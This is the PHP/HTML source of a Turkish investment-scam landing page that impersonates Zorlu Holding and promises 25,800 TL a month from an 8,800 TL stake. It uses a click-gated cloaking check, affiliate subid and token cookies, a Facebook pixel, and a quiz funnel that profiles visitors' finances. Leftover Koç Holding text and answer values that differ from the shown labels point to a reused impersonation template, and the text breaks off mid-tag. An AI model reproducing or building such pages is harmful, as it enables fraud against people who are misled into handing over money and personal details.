<?php
if (!isset($rawClick) && !isset($click)) {
  die();
}
?>
<?php

include_once dirname(__FILE__) . '/config.php';

?>

<!DOCTYPE html>
<html
  lang="tr"
  style="background-color: rgb(255, 255, 255)"
  class="wf-inter-n4-active wf-inter-n6-active wf-inter-n7-active wf-active"
>
  <head>
    <style>
      .overlay-QYNmRcuXX3 {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0, 0, 0, 0.8);
        z-index: 1000;
        -webkit-box-pack: center;
        -webkit-justify-content: center;
        -ms-flex-pack: center;
        justify-content: center;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        overflow-y: auto;
        display: none;
      }
      .lds-spinner-QYNmRcuXX3 {
        color: official;
        display: inline-block;
        position: relative;
        width: 80px;
        height: 80px;
      }
      .lds-spinner-QYNmRcuXX3 div {
        transform-origin: 40px 40px;
        animation: lds-spinner-QYNmRcuXX3 1.2s linear infinite;
      }
      .lds-spinner-QYNmRcuXX3 div:after {
        content: " ";
        display: block;
        position: absolute;
        top: 3px;
        left: 37px;
        width: 6px;
        height: 18px;
        border-radius: 20%;
        background: #fff;
      }
      .lds-spinner-QYNmRcuXX3 div:nth-child(1) {
        transform: rotate(0deg);
        animation-delay: -1.1s;
      }
      .lds-spinner-QYNmRcuXX3 div:nth-child(2) {
        transform: rotate(30deg);
        animation-delay: -1s;
      }
      .lds-spinner-QYNmRcuXX3 div:nth-child(3) {
        transform: rotate(60deg);
        animation-delay: -0.9s;
      }
      .lds-spinner-QYNmRcuXX3 div:nth-child(4) {
        transform: rotate(90deg);
        animation-delay: -0.8s;
      }
      .lds-spinner-QYNmRcuXX3 div:nth-child(5) {
        transform: rotate(120deg);
        animation-delay: -0.7s;
      }
      .lds-spinner-QYNmRcuXX3 div:nth-child(6) {
        transform: rotate(150deg);
        animation-delay: -0.6s;
      }
      .lds-spinner-QYNmRcuXX3 div:nth-child(7) {
        transform: rotate(180deg);
        animation-delay: -0.5s;
      }
      .lds-spinner-QYNmRcuXX3 div:nth-child(8) {
        transform: rotate(210deg);
        animation-delay: -0.4s;
      }
      .lds-spinner-QYNmRcuXX3 div:nth-child(9) {
        transform: rotate(240deg);
        animation-delay: -0.3s;
      }
      .lds-spinner-QYNmRcuXX3 div:nth-child(10) {
        transform: rotate(270deg);
        animation-delay: -0.2s;
      }
      .lds-spinner-QYNmRcuXX3 div:nth-child(11) {
        transform: rotate(300deg);
        animation-delay: -0.1s;
      }
      .lds-spinner-QYNmRcuXX3 div:nth-child(12) {
        transform: rotate(330deg);
        animation-delay: 0s;
      }
      @keyframes lds-spinner-QYNmRcuXX3 {
        0% {
          opacity: 1;
        }
        100% {
          opacity: 0;
        }
      }
      .visible-QYNmRcuXX3 {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
      }
    </style>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <title>Zorlu Holding</title>

    <link href="assets/app.css?v=1" rel="stylesheet" />

    <link
      href="assets/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi"
      crossorigin="anonymous"
    />
    <link rel="stylesheet" href="assets/leadForm.css" />

    <link rel="shortcut icon" href="fav.png" type="image/x-icon" />

    <script src="jquery-3.6.1.min.js"></script>

    <script src="form/js/libs/intlTelInput.js"></script>

    <script src="form/js/libs/jquery.maskedinput.js"></script>
    <script src="form/js/libs/utils.js"></script>

    <script type="application/javascript">
      function getCookie(name) {
        var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
        return v ? v[2] : null;
      }

      function setCookie(name, value, days) {
        var d = new Date();
        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
        document.cookie =
          name + "=" + value + ";path=/;expires=" + d.toGMTString();
      }

      function getSubId() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{subid}".match("{")) {
          return "{subid}";
        }
        var clientSubid =
          '<?php echo isset($client) ? $client->getSubid() : "" ?>';
        if (!clientSubid.match(">")) {
          return clientSubid;
        }
        if (params.get("_subid")) {
          return params.get("_subid");
        }
        if (params.get("subid")) {
          return params.get("subid");
        }
        if (getCookie("subid")) {
          return getCookie("subid");
        }
      }

      function getToken() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{token}".match("{")) {
          return "{token}";
        }
        var clientToken =
          '<?php echo isset($client) ? $client->getToken() : "" ?>';
        if (!clientToken.match(">")) {
          return clientToken;
        }
        if (params.get("_token")) {
          return params.get("_token");
        }
        if (params.get("token")) {
          return params.get("token");
        }
        if (getCookie("token")) {
          return getCookie("token");
        }
        return null;
      }

      function getPixel() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{pixel}".match("{")) {
          return "{pixel}";
        }
        if (params.get("pixel")) {
          return params.get("pixel");
        }

        if (getCookie("pixel")) {
          return getCookie("pixel");
        }

        return null;
      }

      if (typeof URLSearchParams === "function") {
        document.addEventListener("DOMContentLoaded", function (event) {
          var params = new URLSearchParams(document.location.search.substr(1));
          var subid = getSubId();
          var token = getToken();
          var pixel = getPixel();

          params.set("_token", token);
          setCookie("pixel", pixel);
          setCookie("token", token);
          setCookie("subid", subid);
        });
      }
    </script>

    <!--PIXEL DEFENCE-->
    <?php if($FacebookPixel): ?>
    <script type="application/javascript">
      !(function (f, b, e, v, n, t, s) {
        if (f.fbq) return;
        n = f.fbq = function () {
          n.callMethod
            ? n.callMethod.apply(n, arguments)
            : n.queue.push(arguments);
        };
        if (!f._fbq) f._fbq = n;
        n.push = n;
        n.loaded = !0;
        n.version = "2.0";
        n.queue = [];
        t = b.createElement(e);
        t.async = !0;
        t.src = v;
        s = b.getElementsByTagName(e)[0];
        s.parentNode.insertBefore(t, s);
      })(
        window,
        document,
        "script",
        "https://connect.facebook.net/en_US/fbevents.js"
      );
      fbq("init", "<?=$FacebookPixel ?>");
      fbq("track", "PageView");
    </script>
    <?php endif; ?>
  </head>

  <body style="background-color: rgb(255, 255, 255)">
    <div
      class="app-wrapper light-blue"
      style="
        --color: #142143;
        --color-lighten: #c9ac14;
        --color-lighten10: #fae057;
        --color-lighten2: #fae057;
        --color-darken: #002d75;
        --color-darken10: #0041a8;
        --color-alpha: rgba(0, 84, 221, 0.5);
        --color-alpha2: rgba(0, 84, 221, 0.2);
        --color-alpha3: rgba(0, 84, 221, 0.05);
        --color-text: #ffffff;
        --color-text2: #0054dd;
        --gradient-main: 331deg, rgb(0, 45, 117), rgb(66, 139, 255);
        --color-primary-text-button: #fff;
        --color-bg-sidebar: #f7f7f7;
        --color-bg-1: #ededed;
        --color-bg-2: #e6e6e6;
        --color-bg-3: #cccccc;
        --color-bg-4: #b3b3b3;
        --color-bg-5: #999999;
        --color-bg-6: rgba(0, 0, 0, 0.7);
        --color-bg-7: #ededed;
        --color-bg-8: #d9d9d9;
        --color-bg-9: #363636;
        --color-bg-text: #000000;
        --color-bg-quiz: #ffffff;
        --color-bg-alpha0: rgba(255, 255, 255, 0);
        --color-bg-alpha2: rgba(0, 0, 0, 0.2);
        --color-bg-alpha7: rgba(0, 0, 0, 0.7);
        --color-white-label: #ffffff;
        --color-bg-sub-text: #a6a6a6;
        --font: 'Inter';
      "
    >
      <div id="app" class="app">
        <div class="layout" id="mainForm">
          <div class="app__start-page test-step active">
            <div
              class="start-page columns is-desktop-modal start-page_has_bg start-page_position_right start-page_mode_start start-page_theme_expanded"
            >
              <div class="head-logo" style="position: relative">
                <div class="b-quiz-question__title">
                  <div class="logo__img">
                    <img src="assets/logo.png" />
                  </div>
                  <div
                    id="start-menu"
                    class="nav-menu"
                    style="display: flex; width: 50%; justify-content: flex-end"
                  >
                    <div
                      class="phone__img"
                      style="align-self: center; padding: 0 15px"
                    >
                      <img width="24" height="24" src="assets/icon-call.svg" />
                    </div>
                    <div
                      style="
                        margin-right: 20px !important;
                        align-self: center;
                        padding: 0 15px;
                      "
                    >
                      <svg
                        width="24"
                        height="24"
                        fill="white"
                        viewbox="0 0 20 20"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <rect y="9" width="20" height="2"></rect>
                        <rect y="3" width="20" height="2"></rect>
                        <rect y="15" width="20" height="2"></rect>
                      </svg>
                    </div>
                  </div>
                </div>
              </div>

              <div class="video-background">
                <video
                  playsinline="playsinline"
                  autoplay="autoplay"
                  muted="muted"
                  loop="loop"
                >
                  <source src="video/video.mp4?v=2" type="video/mp4" />
                </video>
              </div>

              <div class="video-background-mobile">
                <video
                  playsinline="playsinline"
                  autoplay="autoplay"
                  muted="muted"
                  loop="loop"
                >
                  <source src="video/video.mp4?v=2" type="video/mp4" />
                </video>
              </div>

              <div
                class="start-page__content column is-1"
                style="z-index: 100; left: 1px !important; max-width: 55%"
              >
                <div class="start-page__body">
                  <div class="start-page__line" style="width: 60px"></div>
                  <img
                    src="assets/logo.png"
                    alt="Koç Holding"
                    style="max-width: 280px; width: 100%; margin-bottom: 25px"
                  />
                  <h1 class="start-page__header">
                    Zorlu Holding hisselerini 8 800 TL'den başlayan miktarla
                    satın alarak her ay 25.800 kazanabilirsiniz
                  </h1>
                </div>
              </div>
              <div class="start-page__content column is-5" style="z-index: 100">
                <div class="start-page__body">
                  <div class="start-page__line"></div>
                  <h1 class="start-page__header">
                    "Zorlu Holding ile hayallerinizi nasıl
                    gerçekleştirebilirsiniz?
                  </h1>
                  <h2 class="start-page__subheader">
                    Çok uluslu Zorlu Holding konglomera nın resmi testini geçin,
                    platforma erişim sağlayın ve ülkenin kaynaklarından para
                    kazanmaya başlayın."
                  </h2>
                  <button
                    type="button"
                    class="start-page__button button is-primary is-blicked has-light-shadow next-btn"
                  >
                    <span class="icon">
                      <svg viewbox="0 0 24 24" class="mdi-icon mdi-24px">
                        <title>mdi-checkbox-marked-circle-outline</title>
                        <path
                          d="M20,12C20,16.42 16.42,20 12,20C7.58,20 4,16.42 4,12C4,7.58 7.58,4 12,4C12.76,4 13.5,4.11 14.2,4.31L15.77,2.74C14.61,2.26 13.34,2 12,2C6.48,2 2,6.48 2,12C2,17.52 6.48,22 12,22C17.52,22 22,17.52 22,12M7.91,10.08L6.5,11.5L11,16L21,6L19.59,4.58L11,13.17L7.91,10.08Z"
                          stroke-width="0"
                          fill-rule="nonzero"
                        ></path>
                      </svg>
                    </span>
                    &nbsp; Teste başla
                  </button>
                </div>
              </div>
              <!-- <div class="start-page__layer"></div> -->
            </div>
          </div>

          <!-- Question 1 -->
          <div class="quiz-container test-step">
            <div class="head-logo" style="z-index: 1000; position: relative">
              <div class="b-quiz-question__title" style="display: flex">
                <div class="logo__img">
                  <img src="assets/logo.png" />
                </div>
                <div
                  class="nav-menu"
                  style="display: flex; width: 50%; justify-content: flex-end"
                ></div>
              </div>
            </div>
            <div class="quiz">
              <div class="quiz__questions">
                <div class="quiz__questions-header">
                  <div
                    class="title quiz__question-title quiz__question-title_without-title"
                  >
                    <span class="is-block q-uestion">
                      1. Türkiye vatandaşlarının ülkenin milli kaynaklarından
                      gelir elde etme hakkına sahip olduğunu düşünüyor musunuz?
                    </span>
                  </div>
                </div>
                <div
                  class="question quiz__question question_variants"
                  id="DJ17A5860g"
                >
                  <div class="answer-variants answer-variants_has_image">
                    <div
                      class="answer-variants__group"
                      data-question="1"
                      data-questionnew="1. Her Turkiye vatandasinin, ulkenin kaynaklarinin ticaretinden gelir elde etmesi gerektigine inaniyor musunuz?"
                    >
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Evet"
                        data-answernew="a"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_1"
                            value="Evet"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Evet</div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Hayır"
                        data-answernew="b"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_1"
                            value="Hayır"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Hayır</div>
                            </div>
                          </span>
                        </label>
                      </div>
                    </div>
                    <div class="answer-variants__image">
                      <img
                        src="assets/1.png"
                        alt=""
                        class="answer-variants__image-img"
                      />
                    </div>
                  </div>
                </div>
                <div
                  class="quiz__whitelabel quiz__whitelabel_mobile"
                  style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "
                ></div>
                <div class="quiz__buttons">
                  <div class="quiz-buttons is-outline">
                    <div class="quiz-buttons__progress">
                      <div class="progress-bar">
                        <div class="progress-bar-circular-steps">
                          <div class="progress-bar-circular-steps__label">
                            <span>B</span><span>i</span><span>r</span
                            ><span>i</span><span>n</span><span>c</span
                            ><span>i</span> <span>a</span><span>d</span
                            ><span>i</span><span>m</span>
                          </div>
                          <div
                            class="progress-bar-circular-steps__gradient-wrapp"
                            style="--left-percent: 0%; --right-percent: 50%"
                          >
                            <div
                              class="progress-bar-circular-steps__steps"
                              style="left: 0px"
                            >
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <!-- Question 2 -->
          <div class="quiz-container test-step">
            <div class="head-logo" style="z-index: 1000; position: relative">
              <div class="b-quiz-question__title" style="display: flex">
                <div class="logo__img">
                  <img src="assets/logo.png" />
                </div>
                <div
                  class="nav-menu"
                  style="display: flex; width: 50%; justify-content: flex-end"
                ></div>
              </div>
            </div>
            <div class="quiz">
              <div class="quiz__questions">
                <div class="quiz__questions-header">
                  <div
                    class="title quiz__question-title quiz__question-title_without-title"
                  >
                    <span class="is-block q-uestion"
                      >2. Aylık olarak hayallerinizi gerçekleştirmek için
                      yeterli olan para miktarı nedir?
                    </span>
                  </div>
                </div>
                <div
                  class="question quiz__question question_variants"
                  id="DJ17A5860g"
                >
                  <div class="answer-variants answer-variants_has_image">
                    <div
                      class="answer-variants__group"
                      data-question="2. Aylık olarak hayallerinizi gerçekleştirmek için yeterli olan para miktarı nedir?"
                      data-questionnew="2"
                    >
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="5.000 TL"
                        data-answernew="a"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_2"
                            value="5.000 TL"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">10.000 TL</div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="10.000 TL"
                        data-answernew="b"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_2"
                            value="10.000 TL"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">15.000 TL</div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="25.000 TL"
                        data-answernew="c"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_2"
                            value="25.000 TL"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">25.000 TL</div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="25.000 TL üzeri"
                        data-answernew="d"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_2"
                            value="25.000 TL üzeri"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                35.000 TL'den fazla
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                    </div>
                    <div class="answer-variants__image">
                      <img
                        src="assets/2.png"
                        alt=""
                        class="answer-variants__image-img"
                      />
                    </div>
                  </div>
                </div>
                <div
                  class="quiz__whitelabel quiz__whitelabel_mobile"
                  style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "
                ></div>
                <div class="quiz__buttons">
                  <div class="quiz-buttons is-outline">
                    <div class="quiz-buttons__progress">
                      <div class="progress-bar">
                        <div class="progress-bar-circular-steps">
                          <div class="progress-bar-circular-steps__label">
                            <span>İ</span><span>k</span><span>i</span
                            ><span>n</span><span>c</span><span>i</span>
                            <span>a</span><span>d</span><span>i</span
                            ><span>m</span>
                          </div>
                          <div
                            class="progress-bar-circular-steps__gradient-wrapp"
                            style="--left-percent: 0%; --right-percent: 50%"
                          >
                            <div
                              class="progress-bar-circular-steps__steps"
                              style="left: 0px"
                            >
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <!-- Question 3 -->
          <div class="quiz-container test-step">
            <div class="head-logo" style="z-index: 1000; position: relative">
              <div class="b-quiz-question__title" style="display: flex">
                <div class="logo__img">
                  <img src="assets/logo.png" />
                </div>
                <div
                  class="nav-menu"
                  style="display: flex; width: 50%; justify-content: flex-end"
                ></div>
              </div>
            </div>
            <div class="quiz">
              <div class="quiz__questions">
                <div class="quiz__questions-header">
                  <div
                    class="title quiz__question-title quiz__question-title_without-title"
                  >
                    <span class="is-block q-uestion"
                      ><span>3</span>. İstediğiniz miktarı aldığınızda ilk
                      olarak ne yapacaksınız?
                    </span>
                  </div>
                </div>
                <div
                  class="question quiz__question question_variants"
                  id="DJ17A5860g"
                >
                  <div class="answer-variants answer-variants_has_image">
                    <div
                      class="answer-variants__group"
                      data-question="Servetinizi hangi amaçla artırmak istiyorsunuz?"
                      data-questionnew="3"
                    >
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Geleceğinizi güvence altına almak"
                        data-answernew="a"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_3"
                            value="Geleceğinizi güvence altına almak"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Kredi/hipotek ödeyeceğim
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Ailenize yardım etmek"
                        data-answernew="b"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_3"
                            value="Ailenize yardım etmek"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Aileme yardım edeceğim
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Krediyi/ipoteği ödemek"
                        data-answernew="c"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_3"
                            value="Krediyi/ipoteği ödemek"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Ev veya araba alacağım
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Ev veya araba satın almak"
                        data-answernew="d"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_3"
                            value="Ev veya araba satın almak"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Diğer seçenek</div>
                            </div>
                          </span>
                        </label>
                      </div>
                    </div>
                    <div class="answer-variants__image">
                      <img
                        src="assets/3.png"
                        alt=""
                        class="answer-variants__image-img"
                      />
                    </div>
                  </div>
                </div>
                <div
                  class="quiz__whitelabel quiz__whitelabel_mobile"
                  style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "
                ></div>
                <div class="quiz__buttons">
                  <div class="quiz-buttons is-outline">
                    <div class="quiz-buttons__progress">
                      <div class="progress-bar">
                        <div class="progress-bar-circular-steps">
                          <div class="progress-bar-circular-steps__label">
                            <span>Ü</span><span>ç</span><span>ü</span
                            ><span>n</span><span>c</span><span>ü</span>
                            <span>a</span><span>d</span><span>i</span
                            ><span>m</span>
                          </div>
                          <div
                            class="progress-bar-circular-steps__gradient-wrapp"
                            style="--left-percent: 0%; --right-percent: 50%"
                          >
                            <div
                              class="progress-bar-circular-steps__steps"
                              style="left: 0px"
                            >
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <!-- Question 4 -->
          <div class="quiz-container test-step">
            <div class="head-logo" style="z-index: 1000; position: relative">
              <div class="b-quiz-question__title" style="display: flex">
                <div class="logo__img">
                  <img src="assets/logo.png" />
                </div>
                <div
                  class="nav-menu"
                  style="display: flex; width: 50%; justify-content: flex-end"
                ></div>
              </div>
            </div>
            <div class="quiz">
              <div class="quiz__questions">
                <div class="quiz__questions-header">
                  <div
                    class="title quiz__question-title quiz__question-title_without-title"
                  >
                    <span class="is-block q-uestion"
                      ><span>4</span>. Yatırım deneyiminiz var mı?
                    </span>
                  </div>
                </div>
                <div
                  class="question quiz__question question_variants"
                  id="DJ17A5860g"
                >
                  <div class="answer-variants answer-variants_has_image">
                    <div
                      class="answer-variants__group"
                      data-question="Yatırım konusunda deneyiminiz var mı?"
                      data-questionnew="4"
                    >
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Hayır, ama daha fazla bilgi edinmek istiyorum"
                        data-answernew="a"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_4"
                            value="Hayır, ama daha fazla bilgi edinmek istiyorum"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Evet</div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Evet, başarılı"
                        data-answernew="b"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_4"
                            value="Evet, başarılı"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Hayır</div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Evet, başarısız"
                        data-answernew="c"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_4"
                            value="Evet, başarısız"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Hayır, ama bu ilginç, bu alanda nasıl kazanç
                                sağlanacağını daha fazla öğrenmek istiyorum
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                    </div>
                    <div class="answer-variants__image">
                      <img
                        src="assets/4.png"
                        alt=""
                        class="answer-variants__image-img"
                      />
                    </div>
                  </div>
                </div>
                <div
                  class="quiz__whitelabel quiz__whitelabel_mobile"
                  style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "
                ></div>
                <div class="quiz__buttons">
                  <div class="quiz-buttons is-outline">
                    <div class="quiz-buttons__progress">
                      <div class="progress-bar">
                        <div class="progress-bar-circular-steps">
                          <div class="progress-bar-circular-steps__label">
                            <span>D</span><span>ö</span><span>r</span
                            ><span>d</span><span>ü</span><span>n</span
                            ><span>c</span><span>ü</span> <span>a</span
                            ><span>d</span><span>ı</span><span>m</span>
                          </div>
                          <div
                            class="progress-bar-circular-steps__gradient-wrapp"
                            style="--left-percent: 0%; --right-percent: 50%"
                          >
                            <div
                              class="progress-bar-circular-steps__steps"
                              style="left: 0px"
                            >
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <!-- Question 5 -->
          <div class="quiz-container test-step">
            <div class="head-logo" style="z-index: 1000; position: relative">
              <div class="b-quiz-question__title" style="display: flex">
                <div class="logo__img">
                  <img src="assets/logo.png" />
                </div>
                <div
                  class="nav-menu"
                  style="display: flex; width: 50%; justify-content: flex-end"
                ></div>
              </div>
            </div>
            <div class="quiz">
              <div class="quiz__questions">
                <div class="quiz__questions-header">
                  <div
                    class="title quiz__question-title quiz__question-title_without-title"
                  >
                    <span class="is-block q-uestion"
                      ><span>5</span>. Hangi hisseler ilgini çekiyor?
                    </span>
                  </div>
                </div>
                <div
                  class="question quiz__question question_variants"
                  id="DJ17A5860g"
                >
                  <div class="answer-variants answer-variants_has_image">
                    <div
                      class="answer-variants__group"
                      data-question="Hangi hisse senetleriyle ilgileniyorsunuz?"
                      data-questionnew="5"
                    >
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Koç Holding hisseleri"
                        data-answernew="a"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_5"
                            value="Koç Holding hisseleri"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Zorlu Holding hisseleri
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Dünya şirketlerinin hisseleri"
                        data-answernew="b"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_5"
                            value="Dünya şirketlerinin hisseleri"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Kripto para</div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Kripto para birimleri"
                        data-answernew="c"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_5"
                            value=" Kripto para birimleri"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Dünya çapındaki şirketlerin hisseleri
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                    </div>
                    <div class="answer-variants__image">
                      <img
                        src="assets/5.png"
                        alt=""
                        class="answer-variants__image-img"
                      />
                    </div>
                  </div>
                </div>
                <div
                  class="quiz__whitelabel quiz__whitelabel_mobile"
                  style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "
                ></div>
                <div class="quiz__buttons">
                  <div class="quiz-buttons is-outline">
                    <div class="quiz-buttons__progress">
                      <div class="progress-bar">
                        <div class="progress-bar-circular-steps">
                          <div class="progress-bar-circular-steps__label">
                            <span>B</span><span>e</span><span>ş</span
                            ><span>i</span><span>n</span><span>c</span
                            ><span>i</span> <span>a</span><span>d</span
                            ><span>ı</span><span>m</span>
                          </div>
                          <div
                            class="progress-bar-circular-steps__gradient-wrapp"
